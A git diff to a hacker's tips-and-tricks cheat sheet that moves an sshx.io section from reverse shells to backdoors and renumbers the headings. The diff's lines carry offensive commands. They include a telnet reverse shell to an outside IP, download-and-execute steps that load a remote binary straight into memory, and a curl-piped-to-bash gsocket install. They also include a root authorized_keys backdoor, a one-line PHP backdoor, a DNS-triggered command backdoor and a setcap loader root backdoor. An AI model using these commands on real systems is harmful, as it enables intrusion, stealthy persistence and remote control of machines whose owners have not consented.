@@ -63,7 +63,6 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
       3. [with OpenSSL (encrypted)](#sslshell)
       1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
       1. [without /dev/tcp](#reverse-shell-no-bash)
-      2. [with sshx.io (encrypted)](#sshx)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -72,7 +71,8 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
       1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
       1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
 1. [Backdoors](#backdoor)
-   1. [Reverse shell using gs-netcat](#gsnc)
+   1. [gs-netcat](#gsnc)
+   2. [sshx.io](#sshx)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#php-backdoor)
@@ -1607,22 +1607,7 @@ touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
 ```
 Note: Dont forget to `rm /tmp/.fio` after login.
 
-<a id="sshx"></a>
-**5.i.g. Reverse shell with sshx.io (encrypted)**
 
-Access a remote shell from your web browser [https://sshx.io](https://sshx.io).
-
-```shell
-curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
-&& chmod 755 .s \
-&& (PATH=.:$PATH .s -q >.u 2>/dev/null &);
-for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
-```
-
-Or pipe directly into memory:
-```shell
-cd /tmp;(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",@ARGV' -- "-q" >.u 2>/dev/null &);sleep 10;cat .u&&rm -f .u
-```
 
 <a id="revese-shell-remote-moe"></a>
 **5.i.h. Reverse shell with remote.moe and ssh (encrypted)**
@@ -1751,9 +1736,25 @@ or deploy gsocket by running your own deployment server:
 ```sh
 LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
 ```
+<a id="sshx"></a>
+**6.ii. Reverse shell with sshx.io (encrypted)**
+
+Access a remote shell from your web browser [https://sshx.io](https://sshx.io).
+
+```shell
+curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
+&& chmod 755 .s \
+&& (PATH=.:$PATH .s -q >.u 2>/dev/null &);
+for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
+```
+
+Or pipe directly into memory:
+```shell
+cd /tmp;(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",@ARGV' -- "-q" >.u 2>/dev/null &);sleep 10;cat .u&&rm -f .u
+```
 
 <a id="backdoor-auth-keys"></a>
-**6.ii. authorized_keys**
+**6.iii. authorized_keys**
 
 Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>
 
@@ -1770,7 +1771,7 @@ u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
 c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 ```
 <a id="backdoor-network"></a>
-**6.iii. Remote Access to an entire network**
+**6.vi. Remote Access to an entire network**
 
 Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):
 
@@ -1792,7 +1793,7 @@ Other methods:
 * [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.
 
 <a id="php-backdoor"></a>
-**6.iv. Smallest PHP Backdoor**
+**6.v. Smallest PHP Backdoor**
 
 Add this line at the beginning of any PHP file:
 ```php
@@ -1833,7 +1834,7 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 ```
 
 <a id="reverse-dns-backdoor"></a>
-**6.v. Smallest reverse DNS-tunnel Backdoor**
+**6.vi. Smallest reverse DNS-tunnel Backdoor**
 
 Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
@@ -1858,7 +1859,7 @@ bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 
 ```
 
 <a id="ld-backdoor"></a>
-**6.vi. Local Root Backdoor**
+**6.vii. Local Root Backdoor**
 
 #### 1. Backdooring the dynamic loader with setcap
 
@@ -1886,7 +1887,7 @@ exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"ba
 ```
 
 <a id="implant"></a>
-**6.vii. Self-Extracting implant**
+**6.viii. Self-Extracting implant**
 
 Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
 
